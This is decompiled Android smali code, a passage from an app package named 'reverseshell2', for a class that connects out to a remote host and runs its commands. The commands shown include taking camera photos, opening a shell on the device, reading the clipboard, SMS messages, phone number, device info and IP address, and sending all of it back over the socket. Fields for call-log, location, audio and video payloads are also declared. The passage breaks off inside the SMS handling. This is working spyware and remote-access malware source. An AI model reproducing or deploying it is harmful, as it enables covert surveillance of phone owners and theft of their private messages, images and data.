.class public Lcom/example/reverseshell2/tcpConnection;
.super Landroid/os/AsyncTask;
.source "tcpConnection.java"


# annotations
.annotation system Ldalvik/annotation/Signature;
    value = {
        "Landroid/os/AsyncTask<",
        "Ljava/lang/String;",
        "Ljava/lang/Void;",
        "Ljava/lang/Void;",
        ">;"
    }
.end annotation


# static fields
.field static TAG:Ljava/lang/String;

.field public static out:Ljava/io/OutputStream;


# instance fields
.field activity:Landroid/app/Activity;

.field audioManager:Lcom/example/reverseshell2/Payloads/audioManager;

.field context:Landroid/content/Context;

.field functions:Lcom/example/reverseshell2/functions;

.field ipAddr:Lcom/example/reverseshell2/Payloads/ipAddr;

.field locationManager:Lcom/example/reverseshell2/Payloads/locationManager;

.field private mPreview:Lcom/example/reverseshell2/Payloads/CameraPreview;

.field readCallLogs:Lcom/example/reverseshell2/Payloads/readCallLogs;

.field readSMS:Lcom/example/reverseshell2/Payloads/readSMS;

.field shell:Lcom/example/reverseshell2/Payloads/newShell;

.field vibrate:Lcom/example/reverseshell2/Payloads/vibrate;

.field videoRecorder:Lcom/example/reverseshell2/Payloads/videoRecorder;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 45
    const-string v0, "tcpConnectionClass"

    sput-object v0, Lcom/example/reverseshell2/tcpConnection;->TAG:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>(Landroid/app/Activity;Landroid/content/Context;)V
    .locals 1
    .param p1, "activity"    # Landroid/app/Activity;
    .param p2, "context"    # Landroid/content/Context;

    .line 55
    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    .line 41
    new-instance v0, Lcom/example/reverseshell2/Payloads/ipAddr;

    invoke-direct {v0}, Lcom/example/reverseshell2/Payloads/ipAddr;-><init>()V

    iput-object v0, p0, Lcom/example/reverseshell2/tcpConnection;->ipAddr:Lcom/example/reverseshell2/Payloads/ipAddr;

    .line 56
    iput-object p1, p0, Lcom/example/reverseshell2/tcpConnection;->activity:Landroid/app/Activity;

    .line 57
    iput-object p2, p0, Lcom/example/reverseshell2/tcpConnection;->context:Landroid/content/Context;

    .line 58
    new-instance v0, Lcom/example/reverseshell2/functions;

    invoke-direct {v0, p1}, Lcom/example/reverseshell2/functions;-><init>(Landroid/app/Activity;)V

    iput-object v0, p0, Lcom/example/reverseshell2/tcpConnection;->functions:Lcom/example/reverseshell2/functions;

    .line 59
    new-instance v0, Lcom/example/reverseshell2/Payloads/CameraPreview;

    invoke-direct {v0, p2}, Lcom/example/reverseshell2/Payloads/CameraPreview;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/example/reverseshell2/tcpConnection;->mPreview:Lcom/example/reverseshell2/Payloads/CameraPreview;

    .line 60
    new-instance v0, Lcom/example/reverseshell2/Payloads/vibrate;

    invoke-direct {v0, p2}, Lcom/example/reverseshell2/Payloads/vibrate;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/example/reverseshell2/tcpConnection;->vibrate:Lcom/example/reverseshell2/Payloads/vibrate;

    .line 61
    new-instance v0, Lcom/example/reverseshell2/Payloads/readSMS;

    invoke-direct {v0, p2}, Lcom/example/reverseshell2/Payloads/readSMS;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/example/reverseshell2/tcpConnection;->readSMS:Lcom/example/reverseshell2/Payloads/readSMS;

    .line 62
    new-instance v0, Lcom/example/reverseshell2/Payloads/locationManager;

    invoke-direct {v0, p2, p1}, Lcom/example/reverseshell2/Payloads/locationManager;-><init>(Landroid/content/Context;Landroid/app/Activity;)V

    iput-object v0, p0, Lcom/example/reverseshell2/tcpConnection;->locationManager:Lcom/example/reverseshell2/Payloads/locationManager;

    .line 63
    new-instance v0, Lcom/example/reverseshell2/Payloads/audioManager;

    invoke-direct {v0}, Lcom/example/reverseshell2/Payloads/audioManager;-><init>()V

    iput-object v0, p0, Lcom/example/reverseshell2/tcpConnection;->audioManager:Lcom/example/reverseshell2/Payloads/audioManager;

    .line 64
    new-instance v0, Lcom/example/reverseshell2/Payloads/videoRecorder;

    invoke-direct {v0}, Lcom/example/reverseshell2/Payloads/videoRecorder;-><init>()V

    iput-object v0, p0, Lcom/example/reverseshell2/tcpConnection;->videoRecorder:Lcom/example/reverseshell2/Payloads/videoRecorder;

    .line 65
    new-instance v0, Lcom/example/reverseshell2/Payloads/readCallLogs;

    invoke-direct {v0, p2, p1}, Lcom/example/reverseshell2/Payloads/readCallLogs;-><init>(Landroid/content/Context;Landroid/app/Activity;)V

    iput-object v0, p0, Lcom/example/reverseshell2/tcpConnection;->readCallLogs:Lcom/example/reverseshell2/Payloads/readCallLogs;

    .line 66
    new-instance v0, Lcom/example/reverseshell2/Payloads/newShell;

    invoke-direct {v0, p1, p2}, Lcom/example/reverseshell2/Payloads/newShell;-><init>(Landroid/app/Activity;Landroid/content/Context;)V

    iput-object v0, p0, Lcom/example/reverseshell2/tcpConnection;->shell:Lcom/example/reverseshell2/Payloads/newShell;

    .line 67
    return-void
.end method


# virtual methods
.method protected bridge synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 0

    .line 32
    check-cast p1, [Ljava/lang/String;

    invoke-virtual {p0, p1}, Lcom/example/reverseshell2/tcpConnection;->doInBackground([Ljava/lang/String;)Ljava/lang/Void;

    move-result-object p1

    return-object p1
.end method

.method protected varargs doInBackground([Ljava/lang/String;)Ljava/lang/Void;
    .locals 19
    .param p1, "strings"    # [Ljava/lang/String;

    .line 72
    move-object/from16 v1, p0

    const-string v2, "sent"

    const-string v3, "inbox"

    const-string v4, "done"

    const-string v5, "called"

    const-string v6, "service_runner"

    const-string v7, "\n"

    const-string v8, "UTF-8"

    const/4 v0, 0x0

    move-object v9, v0

    .line 76
    .local v9, "socket":Ljava/net/Socket;
    :goto_0
    const/16 v11, 0x15

    :try_start_0
    sget-object v0, Lcom/example/reverseshell2/tcpConnection;->TAG:Ljava/lang/String;

    const-string v12, "trying"

    invoke-static {v0, v12}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 77
    new-instance v0, Ljava/net/Socket;

    invoke-direct {v0}, Ljava/net/Socket;-><init>()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_4

    move-object v9, v0

    .line 79
    const/4 v12, 0x1

    :try_start_1
    new-instance v0, Ljava/net/InetSocketAddress;

    const/4 v13, 0x0

    aget-object v13, p1, v13

    aget-object v14, p1, v12

    invoke-static {v14}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v14

    invoke-direct {v0, v13, v14}, Ljava/net/InetSocketAddress;-><init>(Ljava/lang/String;I)V

    const/16 v13, 0xbb8

    invoke-virtual {v9, v0, v13}, Ljava/net/Socket;->connect(Ljava/net/SocketAddress;I)V
    :try_end_1
    .catch Ljava/net/SocketTimeoutException; {:try_start_1 .. :try_end_1} :catch_1
    .catch Ljava/net/SocketException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_4

    .line 90
    goto :goto_2

    .line 80
    :catch_0
    move-exception v0

    goto :goto_1

    :catch_1
    move-exception v0

    .line 81
    .local v0, "e":Ljava/io/IOException;
    :goto_1
    :try_start_2
    sget-object v13, Lcom/example/reverseshell2/tcpConnection;->TAG:Ljava/lang/String;

    const-string v14, "error"

    invoke-static {v13, v14}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 82
    iget-object v13, v1, Lcom/example/reverseshell2/tcpConnection;->activity:Landroid/app/Activity;

    new-instance v14, Lcom/example/reverseshell2/tcpConnection$1;

    invoke-direct {v14, v1}, Lcom/example/reverseshell2/tcpConnection$1;-><init>(Lcom/example/reverseshell2/tcpConnection;)V

    invoke-virtual {v13, v14}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    .line 91
    .end local v0    # "e":Ljava/io/IOException;
    :goto_2
    invoke-virtual {v9}, Ljava/net/Socket;->isConnected()Z

    move-result v0

    if-eqz v0, :cond_1a

    .line 92
    sget-object v0, Lcom/example/reverseshell2/tcpConnection;->TAG:Ljava/lang/String;

    invoke-static {v0, v4}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 93
    nop

    .line 96
    new-instance v0, Ljava/io/DataOutputStream;

    invoke-virtual {v9}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v13

    invoke-direct {v0, v13}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    sput-object v0, Lcom/example/reverseshell2/tcpConnection;->out:Ljava/io/OutputStream;

    .line 97
    new-instance v0, Ljava/io/BufferedReader;

    new-instance v13, Ljava/io/InputStreamReader;

    invoke-virtual {v9}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;

    move-result-object v14

    invoke-direct {v13, v14}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v0, v13}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    move-object v13, v0

    .line 98
    .local v13, "in":Ljava/io/BufferedReader;
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v14, Landroid/os/Build;->MODEL:Ljava/lang/String;

    invoke-virtual {v0, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    move-object v14, v0

    .line 99
    .local v14, "model":Ljava/lang/String;
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v15, "Hello there, welcome to reverse shell of "

    invoke-virtual {v0, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    move-object v15, v0

    .line 100
    .local v15, "welcomeMess":Ljava/lang/String;
    sget-object v0, Lcom/example/reverseshell2/tcpConnection;->out:Ljava/io/OutputStream;

    invoke-virtual {v15, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v10

    invoke-virtual {v0, v10}, Ljava/io/OutputStream;->write([B)V

    .line 102
    :goto_3
    invoke-virtual {v13}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v0

    move-object v10, v0

    .local v10, "line":Ljava/lang/String;
    if-eqz v0, :cond_18

    .line 104
    sget-object v0, Lcom/example/reverseshell2/tcpConnection;->TAG:Ljava/lang/String;

    invoke-static {v0, v10}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 105
    const-string v0, "exit"

    invoke-virtual {v10, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    .line 107
    invoke-static {v6, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 108
    iget-object v0, v1, Lcom/example/reverseshell2/tcpConnection;->activity:Landroid/app/Activity;

    new-instance v12, Lcom/example/reverseshell2/tcpConnection$2;

    invoke-direct {v12, v1}, Lcom/example/reverseshell2/tcpConnection$2;-><init>(Lcom/example/reverseshell2/tcpConnection;)V

    invoke-virtual {v0, v12}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    .line 114
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    if-lt v0, v11, :cond_0

    .line 115
    iget-object v0, v1, Lcom/example/reverseshell2/tcpConnection;->functions:Lcom/example/reverseshell2/functions;

    iget-object v12, v1, Lcom/example/reverseshell2/tcpConnection;->context:Landroid/content/Context;

    invoke-virtual {v0, v12}, Lcom/example/reverseshell2/functions;->jobScheduler(Landroid/content/Context;)V

    goto :goto_4

    .line 117
    :cond_0
    iget-object v0, v1, Lcom/example/reverseshell2/tcpConnection;->activity:Landroid/app/Activity;

    new-instance v12, Lcom/example/reverseshell2/tcpConnection$3;

    invoke-direct {v12, v1}, Lcom/example/reverseshell2/tcpConnection$3;-><init>(Lcom/example/reverseshell2/tcpConnection;)V

    invoke-virtual {v0, v12}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    .line 124
    :goto_4
    invoke-virtual {v9}, Ljava/net/Socket;->close()V

    const/4 v12, 0x1

    goto :goto_3

    .line 126
    :cond_1
    const-string v0, "camList"

    invoke-virtual {v10, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_2

    .line 128
    iget-object v0, v1, Lcom/example/reverseshell2/tcpConnection;->functions:Lcom/example/reverseshell2/functions;

    invoke-virtual {v0}, Lcom/example/reverseshell2/functions;->get_numberOfCameras()Ljava/lang/String;

    move-result-object v0

    .line 129
    .local v0, "list":Ljava/lang/String;
    sget-object v12, Lcom/example/reverseshell2/tcpConnection;->out:Ljava/io/OutputStream;

    invoke-virtual {v0, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v11

    invoke-virtual {v12, v11}, Ljava/io/OutputStream;->write([B)V

    .line 130
    .end local v0    # "list":Ljava/lang/String;
    const/16 v11, 0x15

    const/4 v12, 0x1

    goto :goto_3

    .line 131
    :cond_2
    const-string v0, "takepic \\d"

    invoke-virtual {v10, v0}, Ljava/lang/String;->matches(Ljava/lang/String;)Z

    move-result v0
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_4

    const-string v11, " "

    if-eqz v0, :cond_3

    .line 133
    :try_start_3
    iget-object v0, v1, Lcom/example/reverseshell2/tcpConnection;->functions:Lcom/example/reverseshell2/functions;

    iget-object v12, v1, Lcom/example/reverseshell2/tcpConnection;->activity:Landroid/app/Activity;

    invoke-virtual {v0, v12}, Lcom/example/reverseshell2/functions;->getScreenUp(Landroid/app/Activity;)V

    .line 134
    invoke-virtual {v10, v11}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_4

    move-object v11, v0

    .line 137
    .local v11, "cameraid":[Ljava/lang/String;
    :try_start_4
    sget-object v0, Lcom/example/reverseshell2/tcpConnection;->out:Ljava/io/OutputStream;

    const-string v12, "IMAGE\n"

    invoke-virtual {v12, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v12

    invoke-virtual {v0, v12}, Ljava/io/OutputStream;->write([B)V

    .line 138
    iget-object v0, v1, Lcom/example/reverseshell2/tcpConnection;->mPreview:Lcom/example/reverseshell2/Payloads/CameraPreview;

    const/4 v12, 0x1

    aget-object v16, v11, v12

    invoke-static/range {v16 .. v16}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v12
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_3

    move-object/from16 v16, v11

    .end local v11    # "cameraid":[Ljava/lang/String;
    .local v16, "cameraid":[Ljava/lang/String;
    :try_start_5
    sget-object v11, Lcom/example/reverseshell2/tcpConnection;->out:Ljava/io/OutputStream;

    invoke-virtual {v0, v12, v11}, Lcom/example/reverseshell2/Payloads/CameraPreview;->startUp(ILjava/io/OutputStream;)V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_2

    .line 144
    goto :goto_6

    .line 139
    :catch_2
    move-exception v0

    goto :goto_5

    .end local v16    # "cameraid":[Ljava/lang/String;
    .restart local v11    # "cameraid":[Ljava/lang/String;
    :catch_3
    move-exception v0

    move-object/from16 v16, v11

    .line 141
    .end local v11    # "cameraid":[Ljava/lang/String;
    .local v0, "e":Ljava/lang/Exception;
    .restart local v16    # "cameraid":[Ljava/lang/String;
    :goto_5
    :try_start_6
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    .line 142
    new-instance v11, Lcom/example/reverseshell2/jumper;

    iget-object v12, v1, Lcom/example/reverseshell2/tcpConnection;->context:Landroid/content/Context;

    invoke-direct {v11, v12}, Lcom/example/reverseshell2/jumper;-><init>(Landroid/content/Context;)V

    invoke-virtual {v11}, Lcom/example/reverseshell2/jumper;->init()V

    .line 143
    invoke-static {v4, v4}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 145
    .end local v0    # "e":Ljava/lang/Exception;
    .end local v16    # "cameraid":[Ljava/lang/String;
    :goto_6
    const/16 v11, 0x15

    const/4 v12, 0x1

    goto/16 :goto_3

    .line 146
    :cond_3
    const-string v0, "shell"

    invoke-virtual {v10, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_4

    .line 148
    sget-object v0, Lcom/example/reverseshell2/tcpConnection;->out:Ljava/io/OutputStream;

    const-string v11, "SHELL"

    invoke-virtual {v11, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v11

    invoke-virtual {v0, v11}, Ljava/io/OutputStream;->write([B)V

    .line 149
    iget-object v0, v1, Lcom/example/reverseshell2/tcpConnection;->shell:Lcom/example/reverseshell2/Payloads/newShell;

    sget-object v11, Lcom/example/reverseshell2/tcpConnection;->out:Ljava/io/OutputStream;

    invoke-virtual {v0, v9, v11}, Lcom/example/reverseshell2/Payloads/newShell;->executeShell(Ljava/net/Socket;Ljava/io/OutputStream;)V

    const/16 v11, 0x15

    const/4 v12, 0x1

    goto/16 :goto_3

    .line 151
    :cond_4
    const-string v0, "getClipData"

    invoke-virtual {v10, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_6

    .line 153
    iget-object v0, v1, Lcom/example/reverseshell2/tcpConnection;->functions:Lcom/example/reverseshell2/functions;

    invoke-virtual {v0}, Lcom/example/reverseshell2/functions;->readFromClipboard()Ljava/lang/String;

    move-result-object v0

    .line 154
    .local v0, "clipboard_data":Ljava/lang/String;
    if-eqz v0, :cond_5

    .line 156
    new-instance v11, Ljava/lang/StringBuilder;

    invoke-direct {v11}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v11, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v11, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    move-object v0, v11

    .line 157
    sget-object v11, Lcom/example/reverseshell2/tcpConnection;->out:Ljava/io/OutputStream;

    invoke-virtual {v0, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/io/OutputStream;->write([B)V

    goto :goto_7

    .line 161
    :cond_5
    sget-object v11, Lcom/example/reverseshell2/tcpConnection;->out:Ljava/io/OutputStream;

    const-string v12, "No Clipboard Data Present\n"

    invoke-virtual {v12, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/io/OutputStream;->write([B)V

    .line 163
    .end local v0    # "clipboard_data":Ljava/lang/String;
    :goto_7
    const/16 v11, 0x15

    const/4 v12, 0x1

    goto/16 :goto_3

    .line 164
    :cond_6
    const-string v0, "deviceInfo"

    invoke-virtual {v10, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_7

    .line 166
    sget-object v0, Lcom/example/reverseshell2/tcpConnection;->out:Ljava/io/OutputStream;

    iget-object v11, v1, Lcom/example/reverseshell2/tcpConnection;->functions:Lcom/example/reverseshell2/functions;

    invoke-virtual {v11}, Lcom/example/reverseshell2/functions;->deviceInfo()Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v11}, Ljava/lang/String;->getBytes()[B

    move-result-object v11

    invoke-virtual {v0, v11}, Ljava/io/OutputStream;->write([B)V

    const/16 v11, 0x15

    const/4 v12, 0x1

    goto/16 :goto_3

    .line 168
    :cond_7
    const-string v0, "help"

    invoke-virtual {v10, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_8

    .line 170
    sget-object v0, Lcom/example/reverseshell2/tcpConnection;->out:Ljava/io/OutputStream;

    const-string v11, "help\n"

    invoke-virtual {v11}, Ljava/lang/String;->getBytes()[B

    move-result-object v11

    invoke-virtual {v0, v11}, Ljava/io/OutputStream;->write([B)V

    const/16 v11, 0x15

    const/4 v12, 0x1

    goto/16 :goto_3

    .line 172
    :cond_8
    const-string v0, "clear"

    invoke-virtual {v10, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_9

    .line 174
    sget-object v0, Lcom/example/reverseshell2/tcpConnection;->out:Ljava/io/OutputStream;

    const-string v11, "Hello there, welcome to reverse shell \n"

    invoke-virtual {v11, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v11

    invoke-virtual {v0, v11}, Ljava/io/OutputStream;->write([B)V

    const/16 v11, 0x15

    const/4 v12, 0x1

    goto/16 :goto_3

    .line 176
    :cond_9
    const-string v0, "getSimDetails"

    invoke-virtual {v10, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_a

    .line 178
    iget-object v0, v1, Lcom/example/reverseshell2/tcpConnection;->functions:Lcom/example/reverseshell2/functions;

    iget-object v11, v1, Lcom/example/reverseshell2/tcpConnection;->context:Landroid/content/Context;

    invoke-virtual {v0, v11}, Lcom/example/reverseshell2/functions;->getPhoneNumber(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    .line 179
    .local v0, "number":Ljava/lang/String;
    new-instance v11, Ljava/lang/StringBuilder;

    invoke-direct {v11}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v11, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v11, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    move-object v0, v11

    .line 180
    sget-object v11, Lcom/example/reverseshell2/tcpConnection;->out:Ljava/io/OutputStream;

    invoke-virtual {v0, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/io/OutputStream;->write([B)V

    .line 181
    .end local v0    # "number":Ljava/lang/String;
    const/16 v11, 0x15

    const/4 v12, 0x1

    goto/16 :goto_3

    .line 182
    :cond_a
    const-string v0, "getIP"

    invoke-virtual {v10, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_b

    .line 184
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v11, "Device Ip: "

    invoke-virtual {v0, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v11, v1, Lcom/example/reverseshell2/tcpConnection;->ipAddr:Lcom/example/reverseshell2/Payloads/ipAddr;

    const/4 v11, 0x1

    invoke-static {v11}, Lcom/example/reverseshell2/Payloads/ipAddr;->getIPAddress(Z)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v0, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 185
    .local v0, "ip_addr":Ljava/lang/String;
    sget-object v11, Lcom/example/reverseshell2/tcpConnection;->out:Ljava/io/OutputStream;

    invoke-virtual {v0, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/io/OutputStream;->write([B)V

    .line 186
    .end local v0    # "ip_addr":Ljava/lang/String;
    const/16 v11, 0x15

    const/4 v12, 0x1

    goto/16 :goto_3

    .line 187
    :cond_b
    const-string v0, "vibrate \\d"

    invoke-virtual {v10, v0}, Ljava/lang/String;->matches(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_c

    .line 189
    invoke-virtual {v10, v11}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    .line 190
    .local v0, "numbers":[Ljava/lang/String;
    iget-object v11, v1, Lcom/example/reverseshell2/tcpConnection;->vibrate:Lcom/example/reverseshell2/Payloads/vibrate;

    const/4 v12, 0x1

    aget-object v16, v0, v12

    invoke-static/range {v16 .. v16}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v12

    invoke-virtual {v11, v12}, Lcom/example/reverseshell2/Payloads/vibrate;->vib(I)V

    .line 191
    new-instance v11, Ljava/lang/StringBuilder;

    invoke-direct {v11}, Ljava/lang/StringBuilder;-><init>()V

    const-string v12, "Vibrating "

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-object/from16 v16, v4

    const/4 v12, 0x1

    aget-object v4, v0, v12

    invoke-virtual {v11, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, " time successful.\n"

    invoke-virtual {v11, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    .line 192
    .local v4, "res":Ljava/lang/String;
    sget-object v11, Lcom/example/reverseshell2/tcpConnection;->out:Ljava/io/OutputStream;

    invoke-virtual {v4, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/io/OutputStream;->write([B)V

    .line 193
    .end local v0    # "numbers":[Ljava/lang/String;
    .end local v4    # "res":Ljava/lang/String;
    move-object/from16 v4, v16

    const/16 v11, 0x15

    const/4 v12, 0x1

    goto/16 :goto_3

    .line 194
    :cond_c
    move-object/from16 v16, v4

    const-string v0, "getSMS "

    invoke-virtual {v10, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_4

    const-string v4, "END123\n"

    if-eqz v0, :cond_f

    .line 196
    :try_start_7
    invoke-virtual {v10, v11}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    .line 197
    .local v0, "box":[Ljava/lang/String;
    const/4 v11, 0x1

    aget-object v12, v0, v11

    invoke-virtual {v12, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v11

    if-eqz v11, :cond_d

    .line 198
    sget-object v11, Lcom/example/reverseshell2/tcpConnection;->out:Ljava/io/OutputStream;

    const-string v12, "readSMS inbox\n"

    invoke-virtual {v12, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/io/OutputStream;->write([B)V

    .line 199
    iget-object v11, v1, Lcom/example/reverseshell2/tcpConnection;->readSMS:Lcom/example/reverseshell2/Payloads/readSMS;

    invoke-virtual {v11, v3}, Lcom/example/reverseshell2/Payloads/readSMS;->readSMSBox(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    .line 200
    .local v11, "sms":Ljava/lang/String;
    sget-object v12, Lcom/example/reverseshell2/tcpConnection;->out:Ljava/io/OutputStream;

    move-object/from16 v17, v3

    invoke-virtual {v11, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v3

    invoke-virtual {v12, v3}, Ljava/io/OutputStream;->write([B)V

    .line 201
    .end local v11    # "sms":Ljava/lang/String;
    goto :goto_8

    :cond_d
    move-object/from16 v17, v3

    const/4 v3, 0x1

    aget-object v11, v0, v3

    invoke-virtual {v11, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_e

    .line 202
    sget-object v3, Lcom/example/reverseshell2/tcpConnection;->out:Ljava/io/OutputStream;

    const-string v11, "readSMS sent\n"

    invoke-virtual {v11, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v11

    invoke-virtual {v3, v11}, Ljava/io/OutputStream;->write([B)V

    .line 203
    iget-object v3, v1, Lcom/example/reverseshell2/tcpConnection;->readSMS:Lcom/example/reverseshell2/Payloads/readSMS;

    invoke-virtual {v3, v2}, Lcom/example/reverseshell2/Payloads/readSMS;->readSMSBox(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    .line 204
    .local v3, "sms":Ljava/lang/String;
    sget-object v11, Lcom/example/reverseshell2/tcpConnection;->out:Ljava/io/OutputStream;

    invoke-virtual {v3, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/io/OutputStream;->write([B)V

    .line 205
    .end local v3    # "sms":Ljava/lang/String;
    goto :goto_8

    .line 206
    :cond_e
    sget-object v3, Lcom/example/reverseshell2/tcpConnection;->out:Ljava/io/OutputStream;

    const-string v11, "readSMS null\n"

